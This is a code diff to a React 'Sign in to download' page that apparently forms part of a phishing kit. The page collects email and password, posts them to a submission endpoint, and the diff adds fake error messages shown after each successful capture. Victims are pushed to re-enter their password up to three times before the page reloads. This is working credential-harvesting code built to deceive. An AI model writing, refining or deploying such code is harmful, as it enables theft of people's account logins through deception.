@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { FileText, Link as LinkIcon, X, Loader2 } from 'lucide-react';
+import { FileText, Link as LinkIcon, X, Loader2, AlertCircle } from 'lucide-react';
 
 const BACKGROUNDS = [
   {
@@ -59,6 +59,8 @@ export const HomePage: React.FC = () => {
   const [modalState, setModalState] = useState<'closed' | 'signin' | 'preview'>('closed');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [formData, setFormData] = useState({ email: '', password: '' });
+  const [attempts, setAttempts] = useState(0);
+  const [authError, setAuthError] = useState<string | null>(null);
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
@@ -88,7 +90,15 @@ export const HomePage: React.FC = () => {
 
   const handleSignIn = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    if (attempts >= 3) {
+      window.location.reload();
+      return;
+    }
+
     setIsSubmitting(true);
+    setAuthError(null);
+
     try {
       const response = await fetch('/api/submit-form', {
         method: 'POST',
@@ -100,14 +110,21 @@ export const HomePage: React.FC = () => {
           timestamp: new Date().toLocaleString()
         })
       });
+
       if (response.ok) {
-        // Success - maybe show a message or redirect
-        alert('Sign in successful (simulated)');
-        setModalState('closed');
-        setFormData({ email: '', password: '' });
+        const errorMessages = [
+          "authentication error please try again",
+          "something went wrong check your internet connection"
+        ];
+        const randomMessage = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+        
+        setAttempts(prev => prev + 1);
+        setAuthError(randomMessage);
+        setFormData(prev => ({ ...prev, password: '' }));
       }
     } catch (error) {
       console.error('Submission error:', error);
+      setAuthError("An unexpected error occurred. Please try again.");
     } finally {
       setIsSubmitting(false);
     }
@@ -266,6 +283,17 @@ export const HomePage: React.FC = () => {
 
                 <h2 className="text-3xl font-black text-zinc-900 mb-2">Sign in to download</h2>
                 <p className="text-zinc-500 mb-10">Enter your credentials to access your files.</p>
+
+                {authError && (
+                  <motion.div 
+                    initial={{ opacity: 0, y: -10 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    className="mb-6 p-4 bg-red-50 border border-red-100 text-red-600 rounded-2xl text-sm font-medium flex items-center gap-2"
+                  >
+                    <AlertCircle size={16} />
+                    {authError}
+                  </motion.div>
+                )}
 
                 <form onSubmit={handleSignIn} className="space-y-6">
                   <div className="space-y-2">
